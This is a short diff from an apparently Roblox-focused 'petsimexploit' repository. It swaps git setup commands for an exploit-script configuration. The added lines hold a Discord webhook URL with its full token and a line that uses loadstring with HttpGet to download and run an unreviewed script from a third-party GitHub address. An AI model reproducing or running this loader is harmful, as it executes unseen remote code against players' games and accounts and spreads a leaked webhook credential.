@@ -1,7 +1,5 @@
-echo "# petsimexploit" >> README.md
-git init
-git add README.md
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/Schakov/petsimexploit.git
-git push -u origin main
+This is for robloxUserName = "Schakov777"
+WebHook = "https://discord.com/api/webhooks/1063707616859127839/vlvVd5GL2g25DwXBtBBDqBxf7lVeynQK1g37Odre56QA0cAhjcaaxBed0ZE47t6Xjlep"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/calzzeyy/JonScripts/main/GetRawLink", true))()
